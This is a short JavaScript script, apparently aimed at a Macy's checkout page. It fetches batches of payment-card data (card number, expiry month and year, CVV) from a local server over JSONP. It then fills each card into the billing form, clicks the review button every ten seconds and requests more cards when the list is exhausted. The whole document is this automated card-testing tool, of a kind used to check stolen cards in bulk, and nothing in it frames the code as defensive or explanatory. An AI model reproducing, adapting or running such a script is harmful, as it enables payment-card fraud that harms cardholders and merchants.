var url = "http://localhost:5000/post";
var jsonp_callback = function(arr) {
	var i = 0;
	var len = arr.length;
        var segundos = 5;

	var iteration = function() {
	  if( i < len ) {
	    var json = arr[i];

	    $("#card-number").val(json.card);
	    $("#month-name").val(json.mon);
	    $("#year").val("20" + json.year);
	    $("#security-code").val(json.cvv);
	    $(".button.primary.btn-billing-address-js.billing-review-js")[0].click()
	    setTimeout(function() {
	      iteration();
	    }, 10000);
	  }
	  else {
	    $.ajax({
              url:url,
              dataType: "jsonp"
            });
	  }

	  i++;
	}

	iteration();
};
// Macys
$.ajax({
     url:url,
     dataType: "jsonp"
});
